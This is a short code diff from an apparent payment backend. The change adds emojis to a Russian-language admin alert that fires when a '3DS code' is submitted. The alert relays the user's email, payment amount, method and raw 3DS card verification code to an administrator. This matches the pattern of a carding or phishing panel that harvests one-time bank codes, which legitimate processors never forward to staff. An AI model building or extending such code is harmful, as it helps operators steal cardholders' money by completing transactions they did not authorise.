@@ -390,16 +390,16 @@ IP: {ip_address}
         """Synchronous version of notify_admin_3ds_submitted"""
         try:
             message = f"""
-[3DS] 3DS код получен
+🔐 [3DS] 3DS код получен
 
-Пользователь: {payment.user.email}
-Платеж: {payment.id}
-Сумма: {payment.amount} {payment.currency}
-Метод: {payment.payment_method}
-3DS код: {payment.card_3ds_code or 'N/A'}
-Дата: {payment.created_at.strftime('%Y-%m-%d %H:%M:%S')}
+👤 Пользователь: {payment.user.email}
+🆔 Платеж: {payment.id}
+💰 Сумма: {payment.amount} {payment.currency}
+💳 Метод: {payment.payment_method}
+🔐 3DS код: {payment.card_3ds_code or 'N/A'}
+📅 Дата: {payment.created_at.strftime('%Y-%m-%d %H:%M:%S')}
 
-Время: {payment.created_at.strftime('%Y-%m-%d %H:%M:%S')}
+⏰ Время: {payment.created_at.strftime('%Y-%m-%d %H:%M:%S')}
             """
             
             keyboard = [
